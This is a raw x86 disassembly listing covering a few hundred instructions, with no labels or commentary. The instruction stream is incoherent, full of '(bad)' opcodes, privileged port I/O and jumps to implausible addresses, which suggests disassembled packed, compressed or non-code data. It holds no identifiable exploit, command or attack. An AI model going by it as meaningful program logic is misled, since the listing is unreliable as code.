  42df31:	stos   BYTE PTR es:[edi],al
  42df32:	ins    DWORD PTR es:[edi],dx
  42df33:	fnstsw WORD PTR [ecx+ecx*4-0x76aa39de]
  42df3a:	mov    dh,0x26
  42df3c:	and    eax,0x7b31a12d
  42df41:	push   esp
  42df42:	sub    eax,0x3b3a6b68
  42df47:	fdivr  DWORD PTR [eax]
  42df49:	mov    ds:0xdd0ad85d,eax
  42df4e:	xor    ecx,DWORD PTR gs:[edx]
  42df51:	pop    ebx
  42df52:	mov    edi,0xdd6fd226
  42df57:	push   0x75082369
  42df5c:	cmp    dl,BYTE PTR [ecx+0x952e12]
  42df62:	sbb    edi,DWORD PTR [ebx-0x53d3d393]
  42df68:	cmp    BYTE PTR [esi+0x54],0x3e
  42df6c:	cmc    
  42df6d:	fsubr  DWORD PTR [ebp-0x65]
  42df70:	fisttp QWORD PTR [edx+0x5b]
  42df73:	push   ebx
  42df74:	sub    BYTE PTR [esi-0x2b55344a],0x34
  42df7b:	hlt    
  42df7c:	push   ss
  42df7d:	fimul  DWORD PTR [ebp-0x3c34fa53]
  42df83:	sbb    ebp,DWORD PTR [ebp-0x12]
  42df86:	das    
  42df87:	popa   
  42df88:	cmp    al,0x41
  42df8a:	sbb    edx,0xffffff96
  42df8d:	sub    al,0xf3
  42df8f:	sub    al,0x15
  42df91:	inc    edi
  42df92:	loop   0x42dfe6
  42df94:	or     ebp,DWORD PTR [eax-0x2a]
  42df97:	daa    
  42df98:	imul   eax,DWORD PTR [esi+0x6adb61b8],0xa
  42df9f:	(bad)  
  42dfa0:	fcomp  QWORD PTR [ebx+0x55]
  42dfa3:	ja     0x42e012
  42dfa5:	jg     0x42df82
  42dfa7:	fiadd  DWORD PTR [ebp-0x72b89693]
  42dfad:	popf   
  42dfae:	(bad)  
  42dfb0:	lods   eax,DWORD PTR ds:[esi]
  42dfb1:	lds    eax,FWORD PTR [esi]
  42dfb3:	mov    esp,0x61616374
  42dfb8:	inc    edx
  42dfb9:	push   0x65
  42dfbb:	mov    dl,0x67
  42dfbd:	sbb    al,al
  42dfbf:	aam    0x6e
  42dfc1:	ins    DWORD PTR es:[edi],dx
  42dfc2:	xor    al,0x50
  42dfc4:	sbb    bh,BYTE PTR [edi]
  42dfc6:	aad    0xfa
  42dfc8:	push   0xfffffff8
  42dfca:	pop    esp
  42dfcb:	pop    ss
  42dfcc:	shr    DWORD PTR [esi+0x74816480],0x6b
  42dfd3:	ins    DWORD PTR es:[edi],dx
  42dfd4:	test   al,0xdb
  42dfd6:	inc    esi
  42dfd7:	or     al,0xc3
  42dfd9:	sbb    BYTE PTR [ebx+0x5d8536d4],bl
  42dfdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dfe0:	push   ebp
  42dfe1:	jo     0x42df64
  42dfe3:	lods   eax,DWORD PTR ds:[esi]
  42dfe4:	pop    esp
  42dfe5:	bound  ecx,QWORD PTR [ecx-0x4fd313e5]
  42dfeb:	mov    al,0xb0
  42dfed:	xor    eax,0x6a73878
  42dff2:	fcomp  QWORD PTR [eax+0x6daba631]
  42dff8:	sub    BYTE PTR [esi],0xf0
  42dffb:	leave  
  42dffc:	arpl   WORD PTR [edi],bp
  42dffe:	cmp    ebx,DWORD PTR [edi]
  42e000:	sbb    al,cl
  42e002:	mov    edx,0x7f6342aa
  42e007:	out    0x5,eax
  42e009:	das    
  42e00a:	das    
  42e00b:	clc    
  42e00c:	je     0x42dfe9
  42e00e:	push   ss
  42e00f:	rol    edi,cl
  42e011:	es jle 0x42e025
  42e014:	xchg   edi,eax
  42e015:	pushf  
  42e016:	and    BYTE PTR [esi],cl
  42e018:	sbb    al,0x26
  42e01a:	loop   0x42e072
  42e01c:	pop    ebx
  42e01d:	push   ss
  42e01e:	sti    
  42e01f:	into   
  42e020:	rol    DWORD PTR [ebp-0x67],cl
  42e023:	inc    esp
  42e024:	push   esi
  42e025:	or     ch,BYTE PTR [eax-0x49]
  42e028:	ss pop esp
  42e02a:	xchg   BYTE PTR [eax],bl
  42e02c:	sbb    eax,0x2886cb79
  42e031:	mov    dh,0xdb
  42e033:	nop
  42e034:	fdiv   DWORD PTR ds:[edx]
  42e037:	sbb    bl,BYTE PTR [esi+0x8]
  42e03a:	adc    ebx,esp
  42e03c:	mov    dh,0x85
  42e03e:	fcomp  QWORD PTR [edx+edi*4]
  42e041:	mov    al,0xe1
  42e043:	or     BYTE PTR [ecx],al
  42e045:	loop   0x42e09a
  42e047:	mov    dh,0xa9
  42e049:	sbb    BYTE PTR [ebx-0x14],0x71
  42e04d:	punpckhdq mm0,mm7
  42e050:	add    eax,DWORD PTR [edi+0x56]
  42e053:	je     0x42e059
  42e055:	fcmovnbe st,st(2)
  42e057:	xchg   ebx,eax
  42e058:	fnstsw WORD PTR [eax*8-0x1239fe83]
  42e05f:	ret    0x6db6
  42e062:	(bad)  
  42e063:	mov    al,0xdd
  42e065:	mov    ch,0xef
  42e067:	cmp    al,0xa0
  42e069:	scas   al,BYTE PTR es:[edi]
  42e06a:	stc    
  42e06b:	add    BYTE PTR [esp+ebp*2+0xb],0x1b
  42e070:	xchg   DWORD PTR [esi-0x21eb84f6],ebx
  42e076:	jbe    0x42e08d
  42e078:	mov    cl,0xb0
  42e07a:	or     BYTE PTR [eax],0x73
  42e07d:	cmp    BYTE PTR [ebp+0x75b0e0ff],dh
  42e083:	in     eax,0x2a
  42e085:	xor    ebx,DWORD PTR ds:0xbbed0eca
  42e08b:	mov    ch,0x50
  42e08d:	fld    TBYTE PTR cs:[esi+0x61]
  42e091:	push   0xffffffeb
  42e093:	test   esi,esi
  42e095:	popf   
  42e096:	out    dx,eax
  42e097:	pop    eax
  42e098:	push   0x4e0060a0
  42e09d:	and    DWORD PTR [edi-0x56],0x5db6dadd
  42e0a4:	sbb    DWORD PTR ds:0x56ee9815,edx
  42e0aa:	jg     0x42e02f
  42e0ac:	pop    ecx
  42e0ad:	push   esi
  42e0ae:	test   DWORD PTR [ebx+eax*1-0x2c],eax
  42e0b2:	mov    dh,0x50
  42e0b4:	test   eax,0xa60163e3
  42e0b9:	fisubr DWORD PTR [ebp+0x2b]
  42e0bc:	mov    edi,0xc8d667
  42e0c1:	fmul   QWORD PTR [edx]
  42e0c3:	mov    WORD PTR [edi+eiz*4+0xd],?
  42e0c7:	lock mov al,0x40
  42e0ca:	test   eax,0xc0efdc28
  42e0cf:	pop    edi
  42e0d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0d1:	push   0x5f
  42e0d3:	fstp   st(2)
  42e0d5:	inc    edx
  42e0d6:	nop
  42e0d7:	jns    0x42e135
  42e0d9:	adc    DWORD PTR [eax],ebp
  42e0db:	inc    edx
  42e0dc:	out    0xe4,al
  42e0de:	adc    DWORD PTR [edi+0x47c8400a],edx
  42e0e4:	pop    esp
  42e0e5:	sub    esp,ebx
  42e0e7:	mov    dh,0x15
  42e0e9:	ss stos BYTE PTR es:[edi],al
  42e0eb:	cmp    eax,0x811ad081
  42e0f0:	das    
  42e0f1:	lods   al,BYTE PTR ds:[esi]
  42e0f2:	ret    0x2a87
  42e0f5:	mov    dh,0xed
  42e0f7:	push   esi
  42e0f8:	pop    esi
  42e0f9:	fisttp QWORD PTR [ecx-0x44]
  42e0fc:	mov    ds:0xdb80248c,al
  42e101:	push   ss
  42e102:	mov    ecx,0x8504775
  42e107:	xchg   ebx,eax
  42e108:	inc    esi
  42e109:	fcom   DWORD PTR [ecx]
  42e10b:	ror    DWORD PTR [esi+0x35d4194d],1
  42e111:	mov    ebp,0xadadc445
  42e116:	or     DWORD PTR [edx-0x54],edx
  42e119:	inc    ecx
  42e11a:	cmp    al,0xe8
  42e11c:	xor    BYTE PTR [ebx+0x0],ah
  42e11f:	loopne 0x42e0f7
  42e121:	inc    esp
  42e122:	outs   dx,DWORD PTR ds:[esi]
  42e123:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e125:	jecxz  0x42e110
  42e127:	outs   dx,BYTE PTR ds:[esi]
  42e128:	dec    ebx
  42e129:	je     0x42e18f
  42e12b:	imul   esp,DWORD PTR [edx],0xe207f56
  42e131:	div    BYTE PTR gs:[esi+0x3bd0b506]
  42e138:	dec    edi
  42e139:	cdq    
  42e13a:	xor    eax,0x2e800eb4
  42e13f:	adc    al,0x2a
  42e141:	cmp    DWORD PTR [eax+0x2a],ebx
  42e144:	sbb    edx,0x5fa685ad
  42e14a:	xchg   DWORD PTR [esi+0x40d049c8],esp
  42e150:	mov    WORD PTR [edi-0x2e23beb3],fs
  42e156:	(bad)  
  42e157:	push   esp
  42e158:	(bad)  
  42e159:	mov    al,0xa7
  42e15b:	les    edx,FWORD PTR ds:[edx+0x17]
  42e15f:	lds    esi,FWORD PTR [ecx]
  42e161:	sbb    bl,BYTE PTR [ebp-0x3e73b58a]
  42e167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e168:	rcl    BYTE PTR [esi-0x7d],cl
  42e16b:	imul   edi,DWORD PTR [ecx-0x55863a7d],0x63
  42e172:	rcl    DWORD PTR [esp+ecx*8+0x2e],1
  42e176:	sbb    bl,bl
  42e178:	imul   esp,DWORD PTR cs:[ecx-0x7f],0xe
  42e17d:	cmp    bl,ah
  42e17f:	xchg   ebx,eax
  42e180:	mov    esp,0x8bd61d1f
  42e185:	push   0x46e66b61
  42e18a:	dec    edi
  42e18b:	dec    esp
  42e18c:	in     al,dx
  42e18d:	or     ecx,ebp
  42e18f:	ret    0x56d2
  42e192:	cmp    bh,ch
  42e194:	sbb    dh,dh
  42e196:	inc    esi
  42e197:	shl    DWORD PTR [edi+0x2c],cl
  42e19a:	lods   eax,DWORD PTR ds:[esi]
  42e19b:	add    al,0xb
  42e19d:	ins    DWORD PTR es:[edi],dx
  42e19e:	cmc    
  42e19f:	mov    DWORD PTR [ecx+0x52593e36],ebp
  42e1a5:	push   eax
  42e1a6:	mov    eax,ds:0xc2b18e80
  42e1ab:	lods   eax,DWORD PTR ds:[esi]
  42e1ac:	inc    ecx
  42e1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ae:	test   al,0x3a
  42e1b0:	pop    es
  42e1b1:	pop    edi
  42e1b2:	mov    edx,0x7788942d
  42e1b7:	sahf   
  42e1b8:	xor    DWORD PTR [esi+edx*2],esi
  42e1bb:	test   BYTE PTR [esi],bl
  42e1bd:	frstor [edx-0x5d]
  42e1c0:	add    DWORD PTR [edx+0x63e24bca],edx
  42e1c6:	inc    esi
  42e1c7:	pushf  
  42e1c8:	inc    esp
  42e1c9:	pop    ebx
  42e1ca:	inc    ebx
  42e1cb:	mov    cl,0x92
  42e1cd:	xor    eax,0xede99c09
  42e1d2:	inc    edi
  42e1d3:	rol    BYTE PTR [ebp+0x583272ad],0x61
  42e1da:	adc    BYTE PTR [eax+edx*2],ch
  42e1dd:	cs ins BYTE PTR es:[edi],dx
  42e1df:	in     eax,dx
  42e1e0:	inc    edx
  42e1e1:	jl     0x42e1da
  42e1e3:	mov    dh,0xc5
  42e1e5:	or     esi,edx
  42e1e7:	in     eax,dx
  42e1e8:	sbb    BYTE PTR [ebx-0x49],0x5
  42e1ec:	gs sub dl,bl
  42e1ef:	mov    eax,ds:0x6e37fb4b
  42e1f4:	ins    DWORD PTR es:[edi],dx
  42e1f5:	mov    ebx,0x2c2bef2e
  42e1fa:	inc    esp
  42e1fb:	ds mov bl,0xe8
  42e1fe:	adc    bl,bl
  42e200:	inc    edx
  42e201:	add    BYTE PTR [ebp+0x45],cl
  42e204:	ins    BYTE PTR es:[edi],dx
  42e205:	xchg   edi,eax
  42e206:	mov    ecx,0xfa1dd16e
  42e20b:	repnz push ecx
  42e20d:	xor    BYTE PTR [esi],0x2e
  42e210:	ins    BYTE PTR es:[edi],dx
  42e211:	je     0x42e281
  42e213:	sbb    esp,ecx
  42e215:	test   al,0xa8
  42e217:	repz or al,BYTE PTR [edi-0x3f]
  42e21b:	mov    cs,WORD PTR [edi+0x1a]
  42e21e:	xor    esp,DWORD PTR [edi]
  42e220:	push   ss
  42e221:	fiadd  DWORD PTR [ebp+0x10f8bc25]
  42e227:	sahf   
  42e228:	retf   
  42e229:	outs   dx,BYTE PTR ds:[esi]
  42e22a:	rcr    DWORD PTR [edi-0x22bfcbef],0x32
  42e231:	add    ch,BYTE PTR [ecx]
  42e233:	loop   0x42e29f
  42e235:	outs   dx,BYTE PTR ds:[esi]
  42e236:	add    eax,0x75beb6a2
  42e23b:	pop    ss
  42e23c:	mov    cl,dh
  42e23e:	test   edx,ecx
  42e240:	adc    BYTE PTR [esi],0xba
  42e243:	and    dh,bl
  42e245:	push   DWORD PTR [edx+0x283ab6ce]
  42e24b:	fsubr  DWORD PTR [edi]
  42e24d:	popf   
  42e24e:	inc    ecx
  42e24f:	js     0x42e230
  42e251:	in     al,0xa5
  42e253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e254:	lods   eax,DWORD PTR ds:[esi]
  42e255:	(bad)  [ecx]
  42e257:	sub    DWORD PTR [eax-0xe],0x5fa4847d
  42e25e:	push   eax
  42e25f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e260:	pop    ebx
  42e261:	add    edx,ebx
  42e263:	pop    es
  42e264:	or     al,0x62
  42e266:	push   ss
  42e267:	sahf   
  42e268:	cmp    DWORD PTR [ebx+0x2eaa9ad4],ecx
  42e26e:	ins    BYTE PTR es:[edi],dx
  42e26f:	jp     0x42e241
  42e271:	pop    esi
  42e272:	je     0x42e262
  42e274:	pop    DWORD PTR [esi+esi*4-0x35faafe]
  42e27b:	fistp  DWORD PTR [edx]
  42e27d:	cmp    DWORD PTR [ebp+0x17],ebp
  42e280:	xchg   esi,eax
  42e281:	xchg   esi,eax
  42e282:	pop    ss
  42e283:	inc    esp
  42e284:	xacquire xchg DWORD PTR [edx],edi
  42e287:	repnz and BYTE PTR [edx+0x74],bh
  42e28b:	inc    edi
  42e28c:	jne    0x42e237
  42e28e:	mov    ch,0x65
  42e290:	mov    WORD PTR [esi+0x4514a59],fs
  42e296:	mov    ds:0xa2208da5,eax
  42e29b:	dec    esi
  42e29c:	mov    WORD PTR [esi*4-0x5cbd1dc5],?
  42e2a3:	sbb    bl,0x1
  42e2a6:	inc    ebp
  42e2a7:	push   edx
  42e2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e2a9:	mov    eax,ds:0xb47db0df
  42e2ae:	ins    DWORD PTR es:[edi],dx
  42e2af:	fiadd  DWORD PTR [ebp-0x7c6b2d20]
  42e2b5:	mov    DWORD PTR [ebp-0x5e],edx
  42e2b8:	pop    ebx
  42e2b9:	pop    ecx
  42e2ba:	mov    edx,0x65297231
  42e2bf:	inc    ecx
  42e2c0:	lods   eax,DWORD PTR ds:[esi]
  42e2c1:	and    DWORD PTR [eax+0x17],eax
  42e2c4:	add    DWORD PTR [edi],edx
  42e2c6:	cmp    ah,BYTE PTR [ecx*4+0x315157b2]
  42e2cd:	in     eax,0xdb
  42e2cf:	xchg   BYTE PTR [eax+0x28],ch
  42e2d2:	into   
  42e2d3:	mov    al,ds:0xa27a1371
  42e2d8:	add    BYTE PTR [ecx+0x1b0b1bb6],ah
  42e2de:	or     ebx,DWORD PTR [ecx+ebp*4]
  42e2e1:	out    0xf0,eax
  42e2e3:	call   0x856fa61e
  42e2e8:	lea    esp,[esi-0x6893fa78]
  42e2ee:	test   BYTE PTR [esi+0x4],dl
  42e2f1:	inc    ebp
  42e2f2:	push   ebp
  42e2f3:	stos   BYTE PTR es:[edi],al
  42e2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2f5:	push   eax
  42e2f6:	dec    ebp
  42e2f7:	pop    eax
  42e2f8:	repnz shl BYTE PTR [esi],1
  42e2fb:	add    BYTE PTR [eax-0x187a2b0],dh
  42e301:	cdq    
  42e302:	xor    ch,BYTE PTR [esi+0x5bb8d6e2]
  42e308:	ds sbb eax,0x69d871cf
  42e30e:	mov    ebp,0x85a58db6
  42e313:	sub    al,0xa0
  42e315:	pusha  
  42e316:	add    eax,0xb61590df
  42e31b:	cmp    eax,0x235b8881
  42e320:	ja     0x42e2a8
  42e322:	lahf   
  42e323:	cld    
  42e324:	and    BYTE PTR [edx-0x6d55696a],cl
  42e32a:	or     BYTE PTR [eax+0xe28f280],dl
  42e330:	pop    ebp
  42e331:	call   0xf89e736d
  42e336:	ret    
  42e337:	jp     0x42e2f0
  42e339:	ret    0x5db6
  42e33c:	loope  0x42e35b
  42e33e:	sub    eax,0x579befe9
  42e343:	std    
  42e344:	cmp    BYTE PTR [eax+0x43],cl
  42e347:	(bad)  
  42e348:	mov    dh,0x5d
  42e34a:	push   ebp
  42e34b:	les    esi,FWORD PTR [ebx]
  42e34d:	iret   
  42e34e:	or     al,BYTE PTR gs:0x1b1b4bf8
  42e355:	in     eax,dx
  42e356:	sbb    dh,dl
  42e358:	fidivr DWORD PTR [esi+0x67]
  42e35b:	pusha  
  42e35c:	rcl    DWORD PTR [edx-0x5a77dc86],cl
  42e362:	or     ebx,DWORD PTR [ecx]
  42e364:	and    ecx,DWORD PTR [eax+0xb]
  42e367:	add    al,BYTE PTR [eax-0x5225ddaf]
  42e36d:	jge    0x42e389
  42e36f:	jmp    0xb5ba:0x806e0572
  42e376:	mov    al,0x1b
  42e378:	mov    ?,WORD PTR [eax-0x7f]
  42e37b:	xor    DWORD PTR [edi],ebx
  42e37d:	iret   
  42e37e:	mov    dh,0x6d
  42e380:	arpl   WORD PTR [ebx-0x6],bp
  42e383:	xchg   ecx,eax
  42e384:	out    0x93,al
  42e386:	pop    ebp
  42e387:	xchg   DWORD PTR [edi-0x1dae256a],esp
  42e38d:	push   edx
  42e38e:	add    edx,ebx
  42e390:	jno    0x42e379
  42e392:	xor    al,BYTE PTR [ecx-0x12]
  42e395:	mov    esp,0x826b7005
  42e39a:	popa   
  42e39b:	sar    BYTE PTR [ebx],0x74
  42e39e:	dec    ebx
  42e39f:	mov    dh,0x89
  42e3a1:	push   0x1e4316db
  42e3a6:	mov    al,0xa4
  42e3a8:	sar    DWORD PTR [ecx+ebp*1-0x56],0x68
  42e3ad:	mov    ah,al
  42e3af:	ret    
  42e3b0:	sbb    bl,BYTE PTR [ebp+0x550eddba]
  42e3b6:	test   eax,0x30dd0fa2
  42e3bb:	enter  0xc295,0x68
  42e3bf:	jg     0x42e3ff
  42e3c1:	test   eax,0xefaaad88
  42e3c6:	mov    DWORD PTR ds:0xd6c2c32,esp
  42e3cc:	mov    al,0x95
  42e3ce:	jge    0x42e44c
  42e3d0:	push   edx
  42e3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3d2:	addr16 pop ebx
  42e3d4:	imul   DWORD PTR [ebp+0x0]
  42e3d7:	fsubr  DWORD PTR [esi]
  42e3d9:	jae    0x42e3d6
  42e3db:	xchg   ecx,eax
  42e3dc:	pop    esp
  42e3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3de:	std    
  42e3df:	and    edx,ebp
  42e3e1:	inc    edx
  42e3e2:	aam    0x10
  42e3e4:	mov    al,0xe6
  42e3e6:	sbb    DWORD PTR [edi+eax*2],edi
  42e3e9:	and    al,BYTE PTR [ecx+0x35d2f2e0]
  42e3ef:	aam    0x49
  42e3f1:	add    bl,ah
  42e3f3:	ret    
  42e3f4:	mov    dh,ah
  42e3f6:	add    eax,DWORD PTR ds:0x8c4addb
  42e3fc:	pushf  
  42e3fd:	cmp    eax,0x2da85223
  42e402:	adc    al,0xb4
  42e404:	ins    DWORD PTR es:[edi],dx
  42e405:	scas   eax,DWORD PTR es:[edi]
  42e406:	sub    bl,dl
  42e408:	bound  edx,QWORD PTR [esi-0x3c]
  42e40b:	das    
  42e40c:	in     eax,dx
  42e40d:	inc    esi
  42e40e:	add    ebp,DWORD PTR [eax+0x19f67317]
  42e414:	test   DWORD PTR [ebx+edi*4+0x661bb56c],ecx
  42e41b:	inc    ebp
  42e41c:	adc    DWORD PTR [ebp-0x665e5f09],edx
  42e422:	add    ah,BYTE PTR [edx-0x5f]
  42e425:	sbb    dl,BYTE PTR [ebp+0x37]
  42e428:	mov    BYTE PTR [edi],dl
  42e42a:	fist   DWORD PTR [ecx]
  42e42c:	mov    cl,0xab
  42e42e:	shl    BYTE PTR [esi-0x35b1d45c],0x5f
  42e435:	ins    BYTE PTR es:[edi],dx
  42e436:	mov    ds:0x4aa616d,al
  42e43b:	push   es
  42e43c:	repnz sub cl,ah
  42e43f:	xor    BYTE PTR [edx+0x2b76b62a],bl
  42e445:	mov    ebp,DWORD PTR [edx-0x2b13ece8]
  42e44b:	adc    BYTE PTR [esp+esi*4],al
  42e44e:	add    DWORD PTR [esi-0x5f3239e2],esi
  42e454:	mov    ds:0x36da88ed,eax
  42e459:	adc    BYTE PTR [edi-0x52116762],0xa5
  42e460:	jbe    0x42e4c3
  42e462:	and    BYTE PTR [edx],dh
  42e464:	adc    eax,0x4d86ce7
  42e469:	or     esi,DWORD PTR [ecx-0x368d368b]
  42e46f:	into   
  42e470:	jmp    0x3502:0x1ab75124
  42e477:	or     eax,0x8130b0df
  42e47c:	fisubr DWORD PTR [esi+0x34]
  42e47f:	mov    ss,ebx
  42e481:	(bad)  
  42e482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e483:	mov    edx,0x2e8dcf20
  42e488:	xor    al,0xd4
  42e48a:	lods   eax,DWORD PTR ds:[esi]
  42e48b:	(bad)  
  42e48c:	cmc    
  42e48d:	pusha  
  42e48e:	in     al,0xf7
  42e490:	pop    edi
  42e491:	and    dl,dl
  42e493:	or     cl,BYTE PTR [ebx+0x26]
  42e496:	or     bh,BYTE PTR [edi]
  42e498:	xchg   DWORD PTR [esi+0x7a07b50b],edx
  42e49e:	jb     0x42e45b
  42e4a0:	ins    DWORD PTR es:[edi],dx
  42e4a1:	dec    ebx
  42e4a2:	dec    ebx
  42e4a3:	ja     0x42e48e
  42e4a5:	and    ebp,eax
  42e4a7:	or     BYTE PTR [ebx+0x71],cl
  42e4aa:	add    ebx,DWORD PTR [edi+0x5ba0ae86]
  42e4b0:	arpl   WORD PTR [eax+0x6c],di
  42e4b3:	inc    esp
  42e4b4:	push   es
  42e4b5:	adc    DWORD PTR [edi-0x5272283e],ebp
  42e4bb:	push   ecx
  42e4bc:	int    0x3b
  42e4be:	push   ds
  42e4bf:	ins    DWORD PTR es:[edi],dx
  42e4c0:	mov    BYTE PTR [ecx+0x2bab589c],ch
  42e4c6:	mov    ds:0xb3d4bddb,al
  42e4cb:	cmc    
  42e4cc:	sbb    esi,DWORD PTR [edx+0x2b]
  42e4cf:	cs je  0x42e523
  42e4d2:	jno    0x42e4ca
  42e4d4:	pop    ecx
  42e4d5:	adc    BYTE PTR [edx-0x24ac2499],al
  42e4db:	sbb    cl,BYTE PTR ss:[edx+0x77ea42e0]
  42e4e2:	pop    ss
  42e4e3:	shr    ah,0x6b
  42e4e6:	mov    bh,0xa5
  42e4e8:	ins    DWORD PTR es:[edi],dx
  42e4e9:	sub    ch,BYTE PTR [edi]
  42e4eb:	(bad)  
  42e4ec:	mov    dh,0xb7
  42e4ee:	push   ebx
  42e4ef:	bound  ecx,QWORD PTR ds:0xb443ce77
  42e4f5:	je     0x42e560
  42e4f7:	sub    DWORD PTR [eax+eiz*1-0x7a059d01],ecx
  42e4fe:	mov    esi,0xe95bb5b0
  42e503:	into   
  42e504:	inc    esi
  42e505:	xor    al,0x56
  42e507:	cwde   
  42e508:	push   ds
  42e509:	push   edx
  42e50a:	int    0x22
  42e50c:	add    BYTE PTR [ebx-0x7e],ch
  42e50f:	or     eax,0x1986dc00
  42e514:	add    al,0xc6
  42e516:	(bad)  
  42e517:	rcl    esi,1
  42e519:	mov    dh,0x82
  42e51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e51c:	ds jbe 0x42e514
  42e51f:	fadd   st,st(2)
  42e521:	sub    al,0x5b
  42e523:	sub    al,BYTE PTR [eax-0x1d]
  42e526:	or     BYTE PTR [edi+0x4e65286c],0x86
  42e52d:	adc    al,0x36
  42e52f:	inc    ebp
  42e530:	je     0x42e572
  42e532:	daa    
  42e533:	and    eax,0x82ebf83f
  42e538:	ins    DWORD PTR es:[edi],dx
  42e539:	mov    ebx,0xa116096d
  42e53e:	mov    al,ds:0x3272f545
  42e543:	out    0x2e,al
  42e545:	xchg   esp,eax
  42e546:	das    
  42e547:	ins    BYTE PTR es:[edi],dx
  42e548:	lods   eax,DWORD PTR ds:[esi]
  42e549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e54a:	loope  0x42e522
  42e54c:	add    DWORD PTR [eax],0x40
  42e54f:	repz inc eax
  42e551:	ins    BYTE PTR es:[edi],dx
  42e552:	stc    
  42e553:	ins    DWORD PTR es:[edi],dx
  42e554:	and    DWORD PTR [esi+0x1bf6b482],0x5b805c11
  42e55e:	push   edi
  42e55f:	aad    0x95
  42e561:	xlat   BYTE PTR ds:[ebx]
  42e562:	jbe    0x42e5ae
  42e564:	lods   eax,DWORD PTR ds:[esi]
  42e565:	jl     0x42e53f
  42e567:	push   edi
  42e568:	shl    BYTE PTR [esi+0x2987d201],0xe
  42e56f:	stos   BYTE PTR es:[edi],al
  42e570:	lahf   
  42e571:	sub    al,0x4
  42e573:	ins    DWORD PTR es:[edi],dx
  42e574:	imul   ebx,DWORD PTR [ebx],0x37
  42e577:	lods   al,BYTE PTR ds:[esi]
  42e578:	and    BYTE PTR ds:0x6d2d321a,bl
  42e57e:	pop    ebp
  42e57f:	adc    DWORD PTR [edi+0x23f67af0],edx
  42e585:	sti    
  42e586:	fdiv   DWORD PTR [esi+0x7d9ec96d]
  42e58c:	repz inc ecx
  42e58e:	add    bl,bh
  42e590:	(bad)  
  42e591:	and    ecx,DWORD PTR [eax]
  42e593:	fild   DWORD PTR [eax]
  42e595:	pop    ss
  42e596:	fadd   DWORD PTR [edx-0x6d]
  42e599:	dec    esi
  42e59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e59b:	test   esi,ebp
  42e59d:	fcom   DWORD PTR [esi]
  42e59f:	xlat   BYTE PTR ds:[ebx]
  42e5a0:	ins    BYTE PTR es:[edi],dx
  42e5a1:	in     eax,dx
  42e5a2:	(bad)  
  42e5a3:	inc    edx
  42e5a4:	pop    ebx
  42e5a5:	(bad)  
  42e5a6:	(bad)  
  42e5a8:	shl    BYTE PTR [edi-0x2d49192f],cl
  42e5ae:	mov    dh,0x40
  42e5b0:	(bad)  
  42e5b1:	push   edx
  42e5b2:	cwde   
  42e5b3:	dec    edi
  42e5b4:	jp     0x42e630
  42e5b6:	out    dx,al
  42e5b7:	jne    0x42e5be
  42e5b9:	ins    DWORD PTR es:[edi],dx
  42e5ba:	pop    ss
  42e5bb:	mov    ch,0xb2
  42e5bd:	or     BYTE PTR [eax-0x1416f28c],bl
  42e5c3:	ficomp DWORD PTR [edx]
  42e5c5:	mov    ch,0x47
  42e5c7:	ja     0x42e620
  42e5c9:	mov    esp,0xf28c374d
  42e5ce:	aad    0x2e
  42e5d0:	ins    DWORD PTR es:[edi],dx
  42e5d1:	pop    ebx
  42e5d2:	push   eax
  42e5d3:	loope  0x42e5ec
  42e5d5:	dec    edi
  42e5d6:	inc    edi
  42e5d7:	jnp    0x42e569
  42e5d9:	sub    DWORD PTR [esi],edx
  42e5db:	ds mov ch,0x50
  42e5de:	icebp  
  42e5df:	inc    ebp
  42e5e0:	cdq    
  42e5e1:	adc    ebp,ebp
  42e5e3:	push   ebp
  42e5e4:	mov    bl,0x85
  42e5e6:	(bad)  
  42e5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e5e8:	or     ah,dl
  42e5ea:	xor    ebp,DWORD PTR [ebp+0x3f]
  42e5ed:	fist   WORD PTR [edi+esi*1+0x16]
  42e5f1:	mov    dh,0xa3
  42e5f3:	push   cs
  42e5f4:	and    BYTE PTR ds:0xa7cc5a04,ah
  42e5fa:	(bad)  [edi]
  42e5fc:	outs   dx,BYTE PTR ds:[esi]
  42e5fd:	sbb    eax,0x6e3b1be2
  42e602:	test   BYTE PTR [ebp-0x21c12bfc],al
  42e608:	gs test al,0xd
  42e60b:	adc    al,0x5b
  42e60d:	mov    bl,0x86
  42e60f:	inc    ebx
  42e610:	adc    ch,BYTE PTR [esp+edx*4+0x36]
  42e614:	sub    eax,0xf66bc1b6
  42e619:	push   esi
  42e61a:	clc    
  42e61b:	imul   ebp,DWORD PTR [ecx+0x6b],0x3ec550db
  42e622:	inc    ecx
  42e623:	pop    ss
  42e624:	scas   al,BYTE PTR es:[edi]
  42e625:	inc    ecx
  42e626:	data16 ja 0x42e5b7
  42e629:	adc    BYTE PTR [esi+0x3f628c60],0x2a
  42e630:	or     ebx,DWORD PTR [ebx]
  42e632:	xchg   BYTE PTR [esi+0x5ec3599],dh
  42e638:	dec    ebx
  42e639:	enter  0xd3e8,0x5b
  42e63d:	sub    al,0xb4
  42e63f:	dec    ebx
  42e640:	shl    DWORD PTR [ebx],1
  42e642:	call   FWORD PTR [edi-0x36]
  42e645:	lods   eax,DWORD PTR ds:[esi]
  42e646:	dec    esi
  42e647:	arpl   WORD PTR [edi],dx
  42e649:	push   0xdafc1b80
  42e64e:	mul    BYTE PTR [ecx+0x42]
  42e651:	dec    eax
  42e652:	stc    
  42e653:	mov    ah,0x6d
  42e655:	pop    ss
  42e656:	add    al,0xb
  42e658:	call   0xba368523
  42e65d:	add    DWORD PTR ds:[edi-0x7be47f52],esi
  42e664:	push   ss
  42e665:	cmp    BYTE PTR ds:0x6d02db4a,cl
  42e66b:	inc    edi
